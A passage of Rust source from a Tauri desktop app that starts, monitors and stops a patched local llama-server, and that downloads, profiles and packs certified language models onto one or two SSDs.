                    let name = p.file_name().unwrap_or_default().to_string_lossy().to_string();
                    if name.ends_with(".dylib") && (name.contains("llama") || name.contains("ggml")) {
                        candidates.push(p);
                    }
                }
            }
        }
    }
    for path in candidates {
        let Ok(bytes) = std::fs::read(&path) else { continue };
        if bytes.windows(MARKER.len()).any(|w| w == MARKER) {
            return Ok(());
        }
    }
    Err(format!(
        "this llama-server has no Galactus engine ({}): it would run the model natively, \
         without the expert cache and without the certified numerics. Rebuild it with the patch:\n  \
         patches/appliquer.sh third_party/llama.cpp && cmake --build third_party/llama.cpp/build --target llama-server -j",
        bin.display()
    ))
}

// must not run on the main thread.
#[tauri::command]
async fn server_start(app: AppHandle, model_id: String, cache_gb: Option<u64>) -> Result<(), String> {
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    require_certified_model(&entry)?;
    require_compatible_hardware(&entry, hw_info_impl().ram_gb)?;
    let (model_dir, _pack, profile) = model_paths(&root, &model_id);
    let gguf = find_gguf(&model_dir).ok_or("model GGUF not found")?;
    // Dual-pack resolution: two distinct paths make the engine split every
    // record across both SSDs and read them in parallel (P0v2); identical
    // paths are the classic mono pack.
    let (pack_internal, pack_external) = resolve_packs(&root, &model_id, &entry)?;
    if !pack_internal.is_file() || !pack_external.is_file() {
        return Err("pack not found, install the model first".into());
    }

    let settings = settings_load();
    let override_gb = cache_gb.or_else(|| {
        settings
            .get("cache_gb")
            .and_then(|s| s.trim().parse::<u64>().ok())
    });
    let ram_gb = hw_info_impl().ram_gb.max(8);
    let ram_mode = settings
        .get("ram_mode")
        .map(|s| s.as_str())
        .filter(|s| matches!(*s, "eco" | "balanced" | "perf"))
        .unwrap_or("balanced")
        .to_string();
    // Needed before planning: the cross-check regime keeps a small micro-batch.
    let cpu_moe = entry["cpu_moe"].as_bool().unwrap_or(false)
        || settings.get("cpu_moe").map(|v| v == "1").unwrap_or(false);
    // What the Mac can hand over RIGHT NOW, measured a moment before the
    // engine starts allocating, and what Metal will let it hold resident. The
    // first is the whole reason the planner can step down; the second is the
    // bound the allocator answers to.
    let machine = MachineLimits::probe(ram_gb);
    // Resolved BEFORE planning: every slot past the first is a whole extra KV
    // cache, and the plan has to pay for the slots this start will really ask
    // llama-server for. Per model and per machine, not a flat two.
    let slots = resolved_slots(&entry, machine, &ram_mode, cpu_moe);
    let plan = plan_cache(&entry, machine, override_gb, &ram_mode, cpu_moe, slots)?;
    let (cache_bytes, fraction, ubatch) = (plan.cache_bytes, plan.protected, plan.ubatch);

    // Engine resolution: a developer checkout build wins (always freshest);
    // otherwise the fully relocated llama-server shipped INSIDE the app
    // bundle is used, no Homebrew, no checkout, plug and play.
    let checkout_bin = root.join("third_party/llama.cpp/build/bin/llama-server");
    let server_bin = if checkout_bin.exists() {
        checkout_bin
    } else if let Some(bundled) = bundled_engine() {
        bundled
    } else {
        return Err("llama-server binary not found, build it: cmake --build third_party/llama.cpp/build --target llama-server -j".into());
    };
    // Product law: a certified model NEVER runs as a plain native llama.cpp.
    // A stock build accepts every flag and ignores every GALACTUS_H4_* var, so
    // it would serve the model natively while the app reported the engine
    // regime. Prove the wiring is linked in before spawning anything.
    engine_is_wired(&server_bin)?;

    // A sidecar generated by the installer is mandatory whenever profile.json
    // exists. Check it before replacing a healthy server.
    let has_engine_profile = profile.is_file();
    if !has_engine_profile && model_dir.join("profile.json").is_file() {
        return Err(format!(
            "engine profile missing: {} (regenerate it with scripts/moe-profile.py, \
             or reinstall the model)",
            profile.display()
        ));
    }

    // Every deterministic preflight has succeeded. Only now may this request
    // replace the active server.
    server_stop_impl()?;
    reap_orphan_servers(&root);
    let port = pick_free_port()?;

    // Keep the server's output so failures are visible instead of hanging.
    // The PREVIOUS run is kept alongside: a failed start is usually reported
    // after the user has already retried, and truncating on every start
    // destroyed the only evidence of what actually failed.
    let log_path = app_support().join("llama-server.log");
    let _ = std::fs::create_dir_all(app_support());
    let _ = std::fs::rename(&log_path, app_support().join("llama-server.log.1"));
    let log_out = std::fs::File::create(&log_path).map_err(|e| e.to_string())?;
    let log_err = log_out.try_clone().map_err(|e| e.to_string())?;

    // Engine regime, ALWAYS the H4 wiring, ALWAYS the certified numerics.
    //
    // Certification rule (product law): a certified model runs BIT-EXACT.
    // That is the CPU-experts regime the certification benches validated:
    // the upstream Metal mv_id kernels diverge from CPU truth on iq quants
    // (patch comment, probe v4: 1-2% relative per layer; ppl 8.89 vs 2.67 on
    // GLM at 1.58 bpw), so Metal experts are OPT-IN and explicitly outside
    // the certification envelope ("metal_experts": true in the registry
    // entry, or setting metal_experts=1).
    //
    // The physical micro-batch stays at the planner's guarded value: the
    // certified curves were measured in this envelope, and a different batch
    // shape changes kernel paths and accumulation order, do not trade
    // bit-exactness for prompt speed silently.
    // Residency is judged on the SAME geometry the planner used (the profile
    // measured at install when there is one), not on the registry estimate:
    // the two can drift and the badge would then contradict the plan.
    let expert_total = measured_geometry(&entry)
        .map(|g| g.1)
        .unwrap_or_else(|| entry["expert_bytes_total"].as_u64().unwrap_or(u64::MAX));
    let full_residency = cache_bytes >= expert_total;
    // The Metal parity path (patches 0002-0004) now covers EVERY expert quant
    // type of the certified registry (iq1_s..q3_K, q8_0, q5_0, q4_K, q6_K,
    // mxfp4), verified 32768/32768 identical bits by the parity probe: Metal
    // experts ARE the certified numerics, and the default everywhere. CPU
    // experts stay as an explicit cross-check regime ("cpu_moe": true per
    // model, or setting cpu_moe=1). Resolved before planning, above.
    let metal_experts = !cpu_moe;
    let eff_ubatch: u32 = ubatch;

    let mut cmd = Command::new(&server_bin);
    cmd.env("GALACTUS_H4", "1")
        .env("GALACTUS_H4_INTERNAL", &pack_internal)
        .env("GALACTUS_H4_EXTERNAL", &pack_external)
        .env("GALACTUS_H4_CACHE_BYTES", cache_bytes.to_string())
        .env("GALACTUS_H4_PROTECTED", format!("{fraction:.2}"))
        .env("GALACTUS_H4_QD", "32")
        .env("LC_ALL", "C");
    // Without GALACTUS_PROFILE the engine adopts its builtin GLM-5.2 geometry.
    // That is right for GLM-5.2 itself and wrong for every other model, so the
    // sidecar is mandatory as soon as the install produced a profile: a
    // renamed or deleted profile.engine.txt would otherwise read experts at
    // the wrong offsets instead of failing.
    if has_engine_profile {
        cmd.env("GALACTUS_PROFILE", &profile);
    }
    // The split ratio the install recorded for this model, handed to the
    // engine as a CROSS-CHECK. The engine cuts by the .split record the pack
    // writer left beside the pack; this is the app's independent copy of the
    // same number, and the engine refuses to start when the two disagree
    // rather than reading one of the two volumes at the wrong offset. Only
    // dual installs have it: a mono pack has nothing to split.
    if pack_internal != pack_external {
        if let Some(r) = settings
            .get(&format!("pack_ratio_{model_id}"))
            .map(|v| v.trim())
            .filter(|v| !v.is_empty())
        {
            cmd.env("GALACTUS_H4_RATIO", r);
        }
    }
    if cpu_moe {
        cmd.env("GALACTUS_H4_CPU_MOE", "1");
    } else {
        // Metal experts run through the bit-exact parity path (patches 0002 +
        // 0003): the Metal mul_mat_id replays the CPU algorithm bit for bit
        // for every expert quant type of the flagged models. Certified
        // numerics AND GPU speed, no trade-off.
        cmd.env("GALACTUS_METAL_BITEXACT", "1");
    }
    // Slots and window: --ctx-size is the TOTAL KV budget and llama-server
    // divides it by --parallel, so it is scaled with the slot count. Splitting
    // a fixed 8192 instead would silently give a two-conversation user a
    // 4096-token window per thread.
    //
    // `slots` was resolved before planning, and must stay the same number: the
    // engine has to be started with exactly the slot count the ceiling paid for.
    let ctx_total = CTX_PER_SLOT * slots;
    cmd.arg("--model")
        .arg(&gguf)
        .arg("--host")
        .arg("127.0.0.1")
        .arg("--port")
        .arg(port.to_string())
        .arg("--ctx-size")
        .arg(ctx_total.to_string())
        .arg("--n-gpu-layers")
        .arg("99")
        .arg("--no-repack")
        .arg("--fit")
        .arg("off")
        .arg("--no-mmap");
    if cpu_moe {
        cmd.arg("--n-cpu-moe").arg("99");
    }
    // Logical batch stays normal (the server sizes its output buffers from
    // it, a tiny value asserts in output_reserve). Only the PHYSICAL
    // micro-batch is constrained by the expert-cache probation guard.
    cmd.arg("--batch-size")
        .arg("512")
        .arg("--ubatch-size")
        .arg(eff_ubatch.to_string())
        // One slot per conversation the app is allowed to run at once.
        .arg("--parallel")
        .arg(slots.to_string())
        .args(chat_parsing_args())
        .stdout(Stdio::from(log_out))
        .stderr(Stdio::from(log_err));
    let child = cmd.spawn().map_err(|e| format!("spawn llama-server: {e}"))?;

    // Watchdog: the engine must die WITH the app in every death mode (crash,
    // force quit, kill -9), not only on the clean RunEvent::Exit path. A tiny
    // detached shell outlives us, watches our PID, and kills the server when
    // we are gone. It verifies the command name first so PID reuse can never
    // make it kill an unrelated process.
    {
        let app_pid = std::process::id();
        let srv_pid = child.id();
        let _ = Command::new("/bin/zsh")
            .arg("-c")
            .arg(format!(
                "while kill -0 {app_pid} 2>/dev/null; do sleep 3; done; \
                 if ps -p {srv_pid} -o comm= 2>/dev/null | grep -q llama-server; then \
                   kill {srv_pid} 2>/dev/null; sleep 2; kill -9 {srv_pid} 2>/dev/null; fi"
            ))
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();
    }

    let generation = SERVER_GEN.fetch_add(1, Ordering::SeqCst) + 1;
    {
        let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        s.child = Some(child);
        s.model_id = Some(model_id.clone());
        // Both expert paths are bit-exact, so the regime worth showing is the
        // residency one: it is what tells the user the model runs in a
        // fraction of its own size. CPU experts stay named, being the
        // cross-check regime rather than the default.
        s.mode = if !metal_experts {
            "cpu-bit-exact".into()
        } else if full_residency {
            "resident-bit-exact".into()
        } else {
            "streamed-bit-exact".into()
        };
        s.phase = "starting".into();
    // Verdict of the PREVIOUS model: it says nothing about this one.
    s.tools_ok = None;
        s.generation = generation;
        s.port = port;
        s.slots = slots;
        s.footprint = Some(plan.decision.clone());
    }
    let _ = app.emit(
        "galactus://server",
        json!({"phase": "starting", "footprint": plan.decision}),
    );

    // Health poller: big models can take minutes to warm the arena. It also
    // watches for the process dying, so a broken server surfaces its error
    // instead of leaving the UI on "starting" forever.
    std::thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(900);
        loop {
            if Instant::now() > deadline {
                break;
            }
            std::thread::sleep(Duration::from_millis(1000));
            {
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                // Did it exit already? Then it failed to load.
                if let Some(child) = s.child.as_mut() {
                    if let Ok(Some(status)) = child.try_wait() {
                        let tail = server_log_tail(12);
                        // The engine's own verdict, so a start that died for
                        // want of memory says so instead of handing the user
                        // twelve lines of log to interpret.
                        let kind = classify_engine_failure("", &engine_log_evidence());
                        s.child = None;
                        s.phase = "failed".into();
                        drop(s);
                        let _ = app.emit(
                            "galactus://server",
                            json!({"phase": "failed",
                                   "code": status.code(),
                                   "kind": kind,
                                   "log": tail}),
                        );
                        return;
                    }
                }
            }
            let ok = Command::new("curl")
                .args([
                    "-s",
                    "-o",
                    "/dev/null",
                    "-w",
                    "%{http_code}",
                    "--max-time",
                    "2",
                    &format!("http://127.0.0.1:{port}/health"),
                ])
                .output()
                .map(|o| String::from_utf8_lossy(&o.stdout).trim() == "200")
                .unwrap_or(false);
            if ok {
                // /health goes 200 once the non-expert weights are up, but the
                // real load (graph + Metal pipelines + first experts) only
                // happens on the first inference. Force it NOW with a tiny
                // generation so "ready" means actually ready, instead of the
                // first user message eating the whole warmup.
                {
                    let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                    if s.generation != generation {
                        return;
                    }
                }
                let _ = Command::new("curl")
                    .args([
                        "-s",
                        "-o",
                        "/dev/null",
                        "--max-time",
                        "600",
                        "-H",
                        "Content-Type: application/json",
                        "-d",
                        r#"{"model":"galactus-local","messages":[{"role":"user","content":"ok"}],"max_tokens":4,"stream":false}"#,
                    ])
                    .arg(format!("http://127.0.0.1:{port}/v1/chat/completions"))
                    .output();
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                // Stopped or swapped during the warmup: stay silent.
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                // A crash during the warmup leaves the child unreaped, so
                // is_none() alone would still declare ready on a dead server.
                if let Some(child) = s.child.as_mut() {
                    if let Ok(Some(status)) = child.try_wait() {
                        let tail = server_log_tail(12);
                        // The engine's own verdict, so a start that died for
                        // want of memory says so instead of handing the user
                        // twelve lines of log to interpret.
                        let kind = classify_engine_failure("", &engine_log_evidence());
                        s.child = None;
                        s.phase = "failed".into();
                        drop(s);
                        let _ = app.emit(
                            "galactus://server",
                            json!({"phase": "failed",
                                   "code": status.code(),
                                   "kind": kind,
                                   "log": tail}),
                        );
                        return;
                    }
                }
                s.phase = "ready".into();
                drop(s);
                let _ = app.emit("galactus://server", json!({"phase": "ready"}));

                // The tool probe runs AFTER ready is announced, never before.
                // It costs one short generation, and holding the UI on
                // "starting" for it would make a model that works perfectly
                // for chat look slower to load than it is. The agent surfaces
                // read `tools_ok` and stay disabled while it is still None.
                let verdict = probe_tool_calling(port);
                let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
                if s.generation != generation || s.child.is_none() {
                    return;
                }
                s.tools_ok = verdict;
                drop(s);
                let _ = app.emit(
                    "galactus://server",
                    json!({"phase": "ready", "tools_ok": verdict}),
                );
                return;
            }
        }
        // Deadline passed: kill the stuck server so the state cannot claim
        // "starting" forever with a process nobody can reach.
        {
            let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
            if s.generation == generation {
                if let Some(mut child) = s.child.take() {
                    let _ = child.kill();
                    let _ = child.wait();
                }
                s.phase = "failed".into();
            }
        }
        let _ = app.emit("galactus://server", json!({"phase": "timeout"}));
    });
    Ok(())
}

// Async: child.wait() can block for the whole engine teardown.
#[tauri::command]
async fn server_stop() -> Result<(), String> {
    server_stop_impl()
}

fn server_stop_impl() -> Result<(), String> {
    let mut s = server_state().lock().unwrap_or_else(|e| e.into_inner());
    if let Some(mut child) = s.child.take() {
        let _ = child.kill();
        let _ = child.wait();
    }
    s.model_id = None;
    s.mode = String::new();
    s.phase = "stopped".into();
    s.port = 0;
    // The decision described a process that no longer exists: keeping it would
    // let the UI report a footprint for nothing.
    s.footprint = None;
    Ok(())
}

// ---------------------------------------------------------------- install

static INSTALL_CANCEL: OnceLock<Mutex<HashMap<String, Arc<AtomicBool>>>> = OnceLock::new();

fn install_cancels() -> &'static Mutex<HashMap<String, Arc<AtomicBool>>> {
    INSTALL_CANCEL.get_or_init(|| Mutex::new(HashMap::new()))
}

fn emit_progress(app: &AppHandle, id: &str, phase: &str, pct: f64, label: &str, done: bool) {
    let _ = app.emit(
        "galactus://install-progress",
        json!({"model_id": id, "phase": phase, "pct": pct, "label": label, "done": done}),
    );
}

/// Delete a model: the GGUF folder, the packs INSIDE the repo's pack store,
/// and every per-model setting. Packs living outside the repo (the GLM
/// double-pack on ~/GalactusH4, an external SSD) are never touched: they are
/// reported as spared instead. models/<id> as a symlink removes the LINK only.
#[tauri::command]
async fn delete_model(model_id: String) -> Result<String, String> {
    delete_model_impl(&model_id)
}

fn delete_model_impl(model_id: &str) -> Result<String, String> {
    let root = galactus_root()?;
    // Refuse while this model is serving: the engine holds the pack open.
    {
        let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
        if s.child.is_some() && s.model_id.as_deref() == Some(model_id) {
            return Err("model is running, stop it first".into());
        }
    }
    // Symmetric guard: an install in flight is writing the very files this
    // delete would remove from under it.
    if install_cancels()
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .contains_key(model_id)
    {
        return Err("an install is running for this model, cancel it first".into());
    }
    let entry = registry_entry(&root, model_id)?;
    let mut removed: Vec<String> = Vec::new();
    let mut spared: Vec<String> = Vec::new();

    // Packs resolved for this model: only delete inside the model's OWN
    // folder of the pack store (artifacts/h4/packs/<id>/). Anything else,
    // ~/GalactusH4, an external SSD, or a shared store folder like the GLM
    // tour packs, is spared and reported.
    let own_store = root.join("artifacts/h4/packs").join(model_id);
    let (pack_i, pack_e) = resolve_packs(&root, model_id, &entry)?;
    let mut packs = vec![pack_i];
    if packs[0] != pack_e {
        packs.push(pack_e);
    }
    for p in packs {
        if !p.exists() {
            continue;
        }
        if p.starts_with(&own_store) {
            std::fs::remove_file(&p).map_err(|e| format!("{}: {e}", p.display()))?;
            removed.push(p.display().to_string());
        } else {
            spared.push(p.display().to_string());
        }
    }

    // The model folder. A symlinked models/<id> (the GLM convention points at
    // a shared GGUF directory) loses the link, never the target.
    let model_dir = root.join("models").join(model_id);
    if let Ok(meta) = std::fs::symlink_metadata(&model_dir) {
        if meta.file_type().is_symlink() {
            std::fs::remove_file(&model_dir).map_err(|e| e.to_string())?;
            removed.push(format!("{} (symlink)", model_dir.display()));
        } else if meta.is_dir() {
            std::fs::remove_dir_all(&model_dir).map_err(|e| e.to_string())?;
            removed.push(model_dir.display().to_string());
        }
    }

    // The per-model pack folder (manifests, leftovers), inside the store.
    if own_store.is_dir() {
        std::fs::remove_dir_all(&own_store).map_err(|e| e.to_string())?;
        removed.push(own_store.display().to_string());
    }

    // Per-model settings: pack placement and bench result.
    settings_update(|map| {
        map.remove(&format!("pack_internal_{model_id}"));
        map.remove(&format!("pack_external_{model_id}"));
        map.remove(&format!("bench_{model_id}"));
    })?;

    let mut summary = if removed.is_empty() {
        "nothing to remove".to_string()
    } else {
        format!("removed: {}", removed.join(", "))
    };
    if !spared.is_empty() {
        summary.push_str(&format!(" | kept (outside the repo): {}", spared.join(", ")));
    }
    Ok(summary)
}

#[tauri::command]
fn cancel_install(model_id: String) {
    if let Some(flag) = install_cancels().lock().unwrap_or_else(|e| e.into_inner()).get(&model_id) {
        flag.store(true, Ordering::SeqCst);
    }
}

/// Where the user asked the pack(s) to live: one directory for a mono pack,
/// two for the dual (two-SSD) split. `None` keeps the classic default under
/// artifacts/h4/packs/<id>/.
#[derive(Clone)]
struct InstallVolumes {
    internal_dir: PathBuf,
    external_dir: Option<PathBuf>,
}

#[tauri::command]
async fn install_model(app: AppHandle, model_id: String, volumes: Option<Value>) -> Result<(), String> {
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    require_certified_model(&entry)?;
    require_compatible_hardware(&entry, hw_info_impl().ram_gb)?;
    let vols: Option<InstallVolumes> = volumes.and_then(|v| {
        let internal = v["internal_dir"].as_str().unwrap_or("").trim().to_string();
        if internal.is_empty() {
            return None;
        }
        Some(InstallVolumes {
            internal_dir: PathBuf::from(expand_home(&internal)),
            external_dir: v["external_dir"]
                .as_str()
                .map(str::trim)
                .filter(|s| !s.is_empty())
                .map(|s| PathBuf::from(expand_home(s))),
        })
    });
    let download = entry["download"].clone();
    let base = download["base"]
        .as_str()
        .ok_or("no download URL registered for this model")?
        .to_string();
    let files: Vec<String> = download["files"]
        .as_array()
        .map(|a| {
            a.iter()
                .filter_map(|v| v.as_str().map(|s| s.to_string()))
                .collect()
        })
        .unwrap_or_default();
    if files.is_empty() {
        return Err("no download files registered for this model".into());
    }
    let total_bytes = entry["gguf_bytes"].as_u64().unwrap_or(0);

    // Registry file names end up in `curl -o <models/<id>/<f>>`: refuse
    // anything that could escape the model directory.
    for f in &files {
        if f.starts_with('/') || f.split('/').any(|c| c == "..") {
            return Err(format!("invalid file name in registry: {f}"));
        }
    }
    require_download_space(&root, &model_id, &files, total_bytes)?;

    let cancel = Arc::new(AtomicBool::new(false));
    {
        let mut cancels = install_cancels().lock().unwrap_or_else(|e| e.into_inner());
        // A second click must not spawn a second curl racing on the same file.
        if cancels.contains_key(&model_id) {
            return Err("an install is already running for this model".into());
        }
        cancels.insert(model_id.clone(), cancel.clone());
    }

    std::thread::spawn(move || {
        let result = install_pipeline_with(&root, &model_id, &base, &files, total_bytes, vols.as_ref(), &cancel, &|phase, pct, label| {
            emit_progress(&app, &model_id, phase, pct, label, false);
        });
        match result {
            Ok(()) => emit_progress(&app, &model_id, "done", 100.0, "done", true),
            Err(e) => emit_progress(&app, &model_id, "error", 0.0, &e, true),
        }
        install_cancels().lock().unwrap_or_else(|e| e.into_inner()).remove(&model_id);
    });
    Ok(())
}

// Eight arguments, one over clippy's threshold, and allowed rather than
// bundled into a struct. The eight are genuinely independent: five say what to
// install and three say how to run it, and the only grouping that would satisfy
// the lint is a struct invented for the lint, built at the single call site and
// destructured here. That is more code and one more place for a field to go
// stale, in exchange for nothing a reader gains.
#[allow(clippy::too_many_arguments)]
fn install_pipeline_with(
    root: &Path,
    id: &str,
    base: &str,
    files: &[String],
    total_bytes: u64,
    vols: Option<&InstallVolumes>,
    cancel: &AtomicBool,
    progress: &dyn Fn(&str, f64, &str),
) -> Result<(), String> {
    // Same RAM gate as serving: downloading 200 GB for a model this Mac can
    // never start is a trap, refuse up front with the reason.
    if let Ok(entry) = registry_entry(root, id) {
        if let Some(min) = entry["min_ram_gb"].as_u64() {
            let ram = hw_info_impl().ram_gb;
            if ram < min {
                return Err(format!(
                    "this model needs at least {min} GB of RAM, this Mac has {ram} GB"
                ));
            }
        }
    }
    let (model_dir, default_pack, _profile) = model_paths(root, id);
    std::fs::create_dir_all(&model_dir).map_err(|e| e.to_string())?;

    // 1. Download with resume; progress from on-disk sizes.
    for f in files {
        if cancel.load(Ordering::SeqCst) {
            return Err("cancelled".into());
        }
        let dest = model_dir.join(f);
        let url = format!("{base}/{f}");
        let mut child = Command::new("curl")
            .args(["-L", "-C", "-", "--fail", "--retry", "8", "--retry-delay", "5", "-s", "-o"])
            .arg(&dest)
            .arg(&url)
            .spawn()
            .map_err(|e| format!("curl: {e}"))?;
        loop {
            if cancel.load(Ordering::SeqCst) {
                let _ = child.kill();
                let _ = child.wait();
                return Err("cancelled".into());
            }
            match child.try_wait().map_err(|e| e.to_string())? {
                Some(status) => {
                    if !status.success() {
                        return Err(format!("download failed for {f}"));
                    }
                    break;
                }
                None => {
                    let done: u64 = files
                        .iter()
                        .map(|g| {
                            std::fs::metadata(model_dir.join(g))
                                .map(|m| m.len())
                                .unwrap_or(0)
                        })
                        .sum();
                    let pct = if total_bytes > 0 {
                        (done as f64 / total_bytes as f64 * 60.0).min(60.0)
                    } else {
                        0.0
                    };
                    progress(
                        "download",
                        pct,
                        &format!("download {:.1}/{:.1} GB", done as f64 / 1e9, total_bytes as f64 / 1e9),
                    );
                    std::thread::sleep(Duration::from_secs(2));
                }
            }
        }
    }

    // 1b. Volume decision. With two SSDs the bandwidths are measured FIRST
    //     and the dual split is only kept when the slow one holds at least
    //     35% of the fast one: below that the slow SSD caps the pair and a
    //     mono pack on the fast SSD wins (the guard falls back with a
    //     warning in the progress stream). The faster volume takes the
    //     internal role, so the internal share is always the bigger one.
    //
    //     The split ratio comes from those two measurements and nothing else:
    //     r* = Bi / (Bi + Be) is where the two volumes finish a record at the
    //     same instant. It used to be a compiled 0.7157, which is the optimum
    //     for exactly one pair of SSDs; on two identical NVMe drives, the
    //     commonest dual setup, that constant costs about 43% of first-order
    //     read time per record.
    let mut dual_dirs: Option<(PathBuf, PathBuf)> = None;
    let mut mono_dir: Option<PathBuf> = None;
    let mut split_ratio = PACK_RATIO_DEFAULT;
    if let Some(v) = vols {
        if let Some(ext) = &v.external_dir {
            progress("probe", 60.2, "probing volumes");
            let bw_a = measure_volume(&probe_base_for(&v.internal_dir))?;
            if cancel.load(Ordering::SeqCst) {
                return Err("cancelled".into());
            }
            let bw_b = measure_volume(&probe_base_for(ext))?;
            if cancel.load(Ordering::SeqCst) {
                return Err("cancelled".into());
            }
            let (fast, slow) = (bw_a.max(bw_b), bw_a.min(bw_b));
            if slow >= 0.35 * fast {
                // Second probe, in the engine's own access shape, and ONLY for
                // the ratio: the sequential figures above answer "is this pair
                // worth splitting", this one answers "where". They are not the
                // same question and, measured here, not the same answer. A
                // failure falls back to the sequential pair rather than
                // aborting an install over a probe.
                let (qa, qb) = (
                    measure_volume_queued(&probe_base_for(&v.internal_dir)).unwrap_or(bw_a),
                    measure_volume_queued(&probe_base_for(ext)).unwrap_or(bw_b),
                );
                if cancel.load(Ordering::SeqCst) {
                    return Err("cancelled".into());
                }
                // The ratio is the FASTER volume's share, and the faster
                // volume takes the internal role just below: the two must be
                // ordered the same way or the pack is cut backwards.
                let (q_fast, q_slow) = if bw_a >= bw_b { (qa, qb) } else { (qb, qa) };
                split_ratio = pack_split_ratio(q_fast, q_slow);
                progress(
                    "probe",
                    61.0,
                    &format!(
                        "dual ok {bw_a:.1}/{bw_b:.1} GB/s, en file {q_fast:.1}/{q_slow:.1}, \
                         split {split_ratio:.4}"
                    ),
                );
                dual_dirs = Some(if bw_a >= bw_b {
                    (v.internal_dir.clone(), ext.clone())
                } else {
                    (ext.clone(), v.internal_dir.clone())
                });
            } else {
                progress("probe", 61.0, &format!("dual fallback {bw_a:.1}/{bw_b:.1} GB/s"));
                mono_dir = Some(if bw_a >= bw_b { v.internal_dir.clone() } else { ext.clone() });
            }
        } else {
            mono_dir = Some(v.internal_dir.clone());
        }
    }
    let dual = dual_dirs.is_some();
    let (pack_internal, pack_external): (PathBuf, Option<PathBuf>) = match (&dual_dirs, &mono_dir) {
        (Some((di, de)), _) => (
            di.join(id).join(format!("{id}-internal.pack")),
            Some(de.join(id).join(format!("{id}-external.pack"))),
        ),
        (None, Some(d)) => (d.join(id).join(format!("{id}.pack")), None),
        (None, None) => (default_pack.clone(), None),
    };

    // 2. Profile.
    progress("profile", 62.0, "profiling");
    let out = python3_cmd()
        .current_dir(root)
        .args([
            "scripts/moe-profile.py",
            "--model-directory",
            &format!("models/{id}"),
            "--output",
            &format!("models/{id}/profile.json"),
        ])
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(format!("profile: {}", String::from_utf8_lossy(&out.stderr)));
    }

    // 3. Plan. The dual ratio is the one measured above, passed as a fixed
    //    4-decimal string. That exact spelling is what the pack writer records
    //    beside the pack and what the engine parses back at load: the packer
    //    and the reader therefore cut at the same block, and the engine proves
    //    it by re-deriving the totals before serving anything.
    progress("plan", 65.0, "planning");
    let profile_json = format!("models/{id}/profile.json");
    let plan_json = format!("models/{id}/plan.json");
    let ratio_text = pack_ratio_text(split_ratio);
    let mut plan_args: Vec<&str> = vec![
        "scripts/galactus-pack-plan.py",
        "--profile",
        &profile_json,
        "--output",
        &plan_json,
        "--volumes",
        if dual { "dual" } else { "single" },
    ];
    if dual {
        plan_args.push("--ratio");
        plan_args.push(&ratio_text);
    }
    let out = python3_cmd()
        .current_dir(root)
        .args(&plan_args)
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(format!("plan: {}", String::from_utf8_lossy(&out.stderr)));
    }

    // 4. Pack (fixture check happens inside the writer for full mode via sha
    //    confirmation derived from the plan hash).
    let sha_out = Command::new("shasum")
        .current_dir(root)
        .args(["-a", "256", &format!("models/{id}/plan.json")])
        .output()
        .map_err(|e| e.to_string())?;
    let sha = String::from_utf8_lossy(&sha_out.stdout)
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_string();
    if sha.len() < 12 {
        return Err("plan sha unavailable".into());
    }
    std::fs::create_dir_all(pack_internal.parent().unwrap()).map_err(|e| e.to_string())?;
    if let Some(ext) = &pack_external {
        std::fs::create_dir_all(ext.parent().unwrap()).map_err(|e| e.to_string())?;
    }

    progress("pack", 68.0, "building pack");
    let mut cmd = python3_cmd();
    cmd.current_dir(root)
        .args([
            "scripts/galactus-pack-write.py",
            "--plan",
            &format!("models/{id}/plan.json"),
            "--expected-plan-sha256",
            &sha,
            "--model-directory",
            &format!("models/{id}"),
            "--mode",
            "full",
            "--internal-output",
        ])
        .arg(&pack_internal);
    if let Some(ext) = &pack_external {
        cmd.arg("--external-output").arg(ext);
    }
    let mut child = cmd
        .arg("--manifest")
        .arg(pack_internal.parent().unwrap().join("manifest.json"))
        .args(["--minimum-free-after-gib", "20", "--confirm"])
        .arg(format!("WRITE-{}", &sha[..12]))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;

    // stderr must be drained too: tqdm/warnings alone can fill the pipe and
    // freeze the writer (and this thread) forever.
    let err_h = drain_pipe(child.stderr.take());
    if let Some(stdout) = child.stdout.take() {
        let reader = BufReader::new(stdout);
        for line in reader.lines() {
            // A line that does not decode is skipped, not fatal: this is a
            // child process's output, and one odd byte must not silence the
            // rest of it. Spelled out rather than written `.flatten()`, which
            // says the same thing and spins forever on a reader that fails
            // forever; a pipe reports EOF instead, so this loop ends.
            let Ok(line) = line else { continue };
            if cancel.load(Ordering::SeqCst) {
                let _ = child.kill();
                let _ = child.wait();
                return Err("cancelled".into());
            }
            // "  500/12032 enregistrements, ..." → progress 68..99
            if let Some((a, rest)) = line.trim().split_once('/') {
                if let (Ok(done), Some((total, _))) = (
                    a.trim().parse::<f64>(),
                    rest.split_once(' ').map(|(t, r)| (t.trim_end_matches(',').parse::<f64>().unwrap_or(0.0), r)),
                ) {
                    if total > 0.0 {
                        let pct = 68.0 + (done / total) * 31.0;
                        progress("pack", pct, &format!("pack {done:.0}/{total:.0}"));
                    }
                }
            }
        }
    }
    let status = child.wait().map_err(|e| e.to_string())?;
    let err_tail = String::from_utf8_lossy(&err_h.join().unwrap_or_default())
        .lines()
        .rev()
        .take(4)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join(" | ");
    if !status.success() {
        return Err(if err_tail.trim().is_empty() {
            "pack writer failed".into()
        } else {
            format!("pack writer failed: {err_tail}")
        });
    }

    // 5. Custom placement: remember the pack paths so resolve_packs (serve,
    //    registry, CLI) finds them. The default location needs no settings.
    //
    //    The ratio is remembered alongside, but NOT as the engine's source of
    //    truth: the pack carries its own .split record and that is what the
    //    engine cuts by. What this key buys is a SECOND, independent copy, so
